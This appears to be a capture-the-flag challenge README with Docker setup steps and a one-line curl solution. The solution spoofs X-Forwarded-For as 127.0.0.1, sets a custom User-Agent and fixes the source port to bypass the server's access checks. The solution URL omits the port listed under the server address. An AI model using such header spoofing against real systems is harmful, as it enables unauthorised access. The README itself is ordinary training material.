#### Setup
 * docker build . -t netscape-webappsec:latest
 * docker run -v /opt/netscape/source:/var/www/html -p 9367:80 -d --name netscape-webappsec netscape-webappsec:latest

#### Goals
 * Try to find the flag

#### Server Address
 * http://34.123.144.218:9367/

#### Solution
```
curl http://34.123.144.218/ \
    --header 'X-Forwarded-For:127.0.0.1' \
    --header 'User-Agent:Netscape-Web-Broswer' \
    --local-port 23333
```
